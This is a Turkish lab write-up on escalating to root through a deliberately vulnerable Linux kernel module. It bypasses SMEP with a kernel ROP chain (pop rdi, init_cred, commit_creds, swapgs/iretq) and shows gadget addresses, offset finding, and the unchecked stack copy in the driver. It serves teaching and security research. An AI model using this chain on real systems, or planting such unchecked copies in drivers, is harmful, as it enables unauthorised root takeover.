# Linux Kernel 6.17 — Stack Overflow ile SMEP Bypass: kROP Tekniği

**Yazar:** expo  
**Repo:** https://github.com/exploitbey/kernel-krop-smep-bypass

Bu writeup'ta, SMEP ve SMAP'ın aktif olduğu Linux kernel 6.17.0-5-generic üzerinde kernel stack overflow açığının nasıl sömürüleceği incelenmektedir. Klasik ret2user yöntemi bu koruma karşısında işlevsiz kalmaktadır. Alternatif olarak Kernel ROP (kROP) zinciri kullanılmaktadır.

Diğer korumalar (KASLR, KPTI, shadow stack, stack canary) bu ortamda devre dışı bırakılmıştır; odak noktası yalnızca SMEP bypass tekniğidir.

---

## Önce Korumayı Tanıyalım: SMEP Nedir?

SMEP (Supervisor Mode Execution Prevention), işlemci düzeyinde bir korumadır. Kernel, kullanıcı alanına ait bellek sayfalarındaki kodları çalıştıramaz. Yani kullanıcı tamponuna shellcode yazıp kernel'i oraya yönlendirdiğinizde CPU sizi anında keser.

Klasik ret2user'ın ölmesinin nedeni budur.

SMEP ve SMAP'ın aktif olduğunu GDB'den doğrulayabilirsiniz:

```
info register cr4
```

Değer `0x372ef0` ise binary'ye çevirip bitlere bakın:

```
0x372ef0 → 0011 0111 0010 1110 1111 0000
```

Sağdan sola, index 0'dan başlayarak:

| Bit grubu | Aralık | Anlamı |
|-----------|--------|--------|
| 0000 | 0–3  | — |
| 1111 | 4–7  | Bit 5=PAE, Bit 7=PGE |
| 1110 | 8–11 | Bit 9=OSFXSR, Bit 10=OSXMMEXCPT |
| 0010 | 12–15 | Bit 13=VMXE |
| 0111 | 16–19 | Bit 16=FSGSBASE, Bit 17=PCIDE, Bit 18=OSXSAVE |
| **0011** | **20–23** | **Bit 20=SMEP ✓, Bit 21=SMAP ✓** |

Bit 20 set → SMEP aktif. CPU, Ring 0'dan Ring 3 sayfalarında kod çalıştırmayı bloke ediyor.

Bir not: Kernel 5.16'dan itibaren CR4 yazmacı "pinlendi". Eskiden `mov cr4, rax` tarzı gadget'larla SMEP biti temizlenebiliyordu. Artık o kapı kapalı. Ama bu önemli değil çünkü biz CR4'e hiç dokunmayacağız.

---

## Lab Ortamı

- **Host:** Kali Linux 2025.4
- **Guest:** Lubuntu 25.10, kernel 6.17.0-5-generic (QEMU üzerinde)

Guest'ten host'a `vmlinuz` kopyalanmalı. Kopyaladıktan sonra `vmlinux_raw`'a dönüştürün:

```bash
./extract-vmlinux vmlinuz > vmlinux_raw
```

> Script: https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux

### Gereksinimler

1. Kernel tam olarak **6.17.0-5-generic** olmalı (farklı minor versiyonda binary değişir, gadget adresleri tutmaz)
2. SMEP ve SMAP aktif olmalı
3. KASLR, KPTI, shadow stack, stack canary kapalı olmalı

Guest'teki GRUB satırı:

```
GRUB_CMDLINE_LINUX_DEFAULT="nokaslr nopti ima_appraise=off ima_policy=tcb shstk=off"
```

QEMU başlatma komutu:

```bash
qemu-system-x86_64 \
  -m 4G \
  -enable-kvm \
  -cpu host \
  -drive file=lubuntu25.10-disk.qcow2,format=qcow2 \
  -vga qxl \
  -device virtio-serial-pci \
  -device virtserialport,chardev=spicechannel0,name=com.redhat.spice.0 \
  -chardev spicevmc,id=spicechannel0,name=vdagent \
  -display spice-app \
  -net nic -net user \
  -usb -usbdevice tablet \
  -vga virtio \
  -s -S
```

Sistem boot ederken host'ta GDB'yi başlatın:

```bash
gdb ./vmlinux_raw
# ardından: continue
```

---

## Zafiyetli LKM

Kaynak: `rop.c`

```c
__attribute__((optimize(0)))
static ssize_t device_write(struct file *file, const char __user *buf,
                            size_t count, loff_t *ppos) {
    char tampon[64];
    // ZAFIYET: count kontrolsüz — 64+ byte gelince stack overflow
    if (_copy_from_user(tampon, buf, count)) {
        return -EFAULT;
    }
    return count;
}
```

Buffer 64 byte sabit. `_copy_from_user` kaç byte kopyalanacağını hiç sorgulamıyor. Kullanıcı alanından 65 byte bile göndermek yeterli; kernel stack bozulmaya başlar.

Sömürü giriş noktası: `/dev/vuln_device`

### Derleme ve Yükleme

```bash
sudo su
make          # stack canary kapalı (Makefile'da -fno-stack-protector)
insmod rop.ko
```

Sonra `rop.ko`'yu host'a kopyalayın (GDB için sembol bilgisi gerekiyor).

---

## Stack Frame

x64 çağrı kuralı: ilk argüman RDI, ikinci RSI, üçüncü RDX, dördüncü RCX.

`device_write` çağrıldığında kernel stack'te dönüş adresi `rbp+8` konumundadır. Hedefimiz bu adresi kontrol altına almak.

---

## Sömürü

### Adım 1: Offset Tespiti

LKM debug sembolleriyle derlendi, bu yüzden GDB ile düzgün takip edeceğiz.

Guest'te modül adreslerine bakın:

```bash
cat /proc/modules | grep rop
# rop 12288 0 - Live 0xffffffffc092f000 (OE)

cat /sys/module/rop/sections/.text   # 0xffffffffc092f000
cat /sys/module/rop/sections/.data   # 0xffffffffc0a15020
cat /sys/module/rop/sections/.bss    # 0xffffffffc0a15640
```

Host'taki GDB'ye Ctrl+C basın, sembolleri yükleyin:

```
add-symbol-file /path/to/rop.ko
0xffffffffc092f000 -s .data 0xffffffffc0a15020 -s .bss 0xffffffffc0a15640
```

`_copy_from_user` öncesi ve sonrasına breakpoint:

```
b *0xffffffffc092f059
b *0xffffffffc092f05e
continue
```

Metasploit ile 88 byte'lık pattern oluşturun:

```bash
msf-pattern_create -l 88
```

Pattern'ı `payload.txt` olarak kaydedin, `find_offset` ile gönderin:

```bash
gcc -o find_offset find_offset.c
./find_offset payload.txt
```

Kernel breakpoint'te duracak. GDB'de `rbp+8` içeriğini not edin. İkinci breakpoint'te `rbp+8`'in pattern ile dolduğunu göreceksiniz.

Host'ta offset'i hesaplayın:

```bash
msf-pattern_offset -q 6341356341346341 -l 88
# [*] Exact match at offset 72
```

**Dönüş adresi 72. byte'tan itibaren yazılıyor.**

---

### Adım 2: ROP Payload

SMEP'i neden ROP atlatabiliyor? Çünkü ROP, kernelin kendi `.text` bölgesindeki zaten var olan kodları kullanır. Yeni kod çalıştırmaz. Kullanıcı belleğine hiç dokunmaz. SMEP bunu göremez.

#### Save State

iretq'dan önce user space registerlarını kaydedin:

```c
__asm__ volatile (
    ".intel_syntax noprefix;"
    "mov user_cs,     cs;"
    "mov user_ss,     ss;"
    "mov user_sp,     rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
    ::: "memory"
);
```

`"memory"` clobber kritik: GCC bu değerleri önbelleğe alırsa iretq frame'i bozuk olur.

#### Gadget Zinciri

```c
payload[i++] = POP_RDI_RET;    // pop rdi ; ret
payload[i++] = INIT_CRED;      // → rdi = &init_cred (root kimlik bilgisi)
payload[i++] = COMMIT_CREDS;   // commit_creds(init_cred) → process root oldu
payload[i++] = SWAPGS_RESTORE; // swapgs → iretq'ya yönlendir
```

**Neden `prepare_kernel_cred` yok?**
Kernel 6.17'de `mov rdi, rax ; ret` gibi temiz bir register transfer gadget'ı bulunamadı. `init_cred` zaten statik bir adres, `pop rdi; ret` yeterli. Payload da küçük kalıyor: 144 byte.

**Gadget adresleri:**

`commit_creds` ve `init_cred`:

```bash
cat /proc/kallsyms | grep commit_creds
# ffffffff8145b390 T commit_creds

cat /proc/kallsyms | grep init_cred
# ffffffff8388b860 T init_cred
```

`pop rdi ; ret` → opcode `\x5f\xc3`

`.text` aralığı:

```
Başlangıç : 0xffffffff81000000
Boyut      : 0x1637970
Bitiş      : 0xffffffff82637970
```

```bash
python3 find_opcode.py vmlinux_raw 5fc3
```

İlk sonuç `0xffffffff812582bd` → GDB'de `x/3i 0xffffffff812582bd` ile doğrulayın. Temiz `pop rdi; ret` dizisi.

`swapgs + iretq` → opcode'lar: `0x0F 0x01 0xF8` ve `0x48 0xCF`

```bash
python3 find_swapgs.py vmlinux_raw
```

Script iki aday döndürür. `0xffffffff81001866` çok fazla pop içeriyor, stack bozulur. `0xffffffff8100118f` inceleyin:

```
0xffffffff8100118f: swapgs
0xffffffff81001192: verw WORD PTR [rip+...]   ← ZF'yi etkiler, GPR'ları bozmaz
0xffffffff81001199: test BYTE PTR [rsp+0x8], 0x3
0xffffffff8100119e: jne  0xffffffff81001241
```

Atladığı yerde:

```
0xffffffff81001241: test BYTE PTR [rsp+0x20], 0x4
0xffffffff81001246: jne  0xffffffff8100124a
0xffffffff81001248: iretq
```

Neden bu akış çalışıyor? `user_cs = 0x33`, `user_ss = 0x2b`:

```
test [rsp+0x8],  0x3  → 0x33 AND 0x03 = 0x03 → ZF=0 → jne çalışır → 0x81001241'e atlar
test [rsp+0x20], 0x4  → 0x2b AND 0x04 = 0x00 → ZF=1 → jne çalışmaz → iretq çalışır
```

iretq stack'ten sırayla alır:

```
RSP+0x00 = get_shell   ← RIP (user'a döndüğünde burası çalışır)
RSP+0x08 = user_cs     = 0x33
RSP+0x10 = user_rflags
RSP+0x18 = user_sp
RSP+0x20 = user_ss     = 0x2b
```

#### Final Payload Dizilimi

| Index | Değer | Açıklama |
|-------|-------|----------|
| 0–8   | 0x4141...| Dolgu (72 byte) |
| 9     | POP_RDI_RET | gadget |
| 10    | INIT_CRED | rdi argümanı |
| 11    | COMMIT_CREDS | root yap |
| 12    | SWAPGS_RESTORE | swapgs+iretq yolu |
| 13    | get_shell | iretq RIP |
| 14    | user_cs | iretq CS |
| 15    | user_rflags | iretq RFLAGS |
| 16    | aligned_sp | iretq RSP |
| 17    | user_ss | iretq SS |

---

### Adım 3: Exploit

```bash
gcc -static -o exploit exploit.c -no-pie
./exploit
```

Çıktı:

```
[*] Durum kaydedildi: CS=0x33 SS=0x2b
[*] Cihaz acildi: /dev/vuln_device
[*] Payload hazirlandi (18 slot, 144 byte)
[*] Payload gonderiliyor...
[+] Root elde edildi! Shell aciliyor...
#
```

---

## kROP: Avantajlar ve Dezavantajlar

**Artıları:**
- SMEP'i atlatır (user space'e hiç dokunmaz)
- Kernel NX'i atlatır (yeni kod üretmez)

**Eksileri:**
- KASLR açıksa gadget adresleri her boot'ta değişir, önce bellek sızıntısı gerekir
- Kernel güncellendiğinde `vmlinux_raw` değişir, gadget adresleri tutmaz, exploit yeniden yazılmalıdır

---

## Dosyalar

| Dosya | Açıklama |
|-------|----------|
| `rop.c` | Zafiyetli LKM kaynak kodu |
| `Makefile` | Stack canary kapalı derleme |
| `find_offset.c` | Pattern gönderici (offset tespiti) |
| `find_opcode.py` | vmlinux'ta opcode tarayıcı |
| `find_swapgs.py` | swapgs+iretq gadget bulucu |
| `exploit.c` | Tam kROP exploit |

---

*Bu çalışma eğitim ve güvenlik araştırması amacıyla hazırlanmıştır. Yalnızca kendi kurduğunuz lab ortamlarında uygulanmalıdır.*
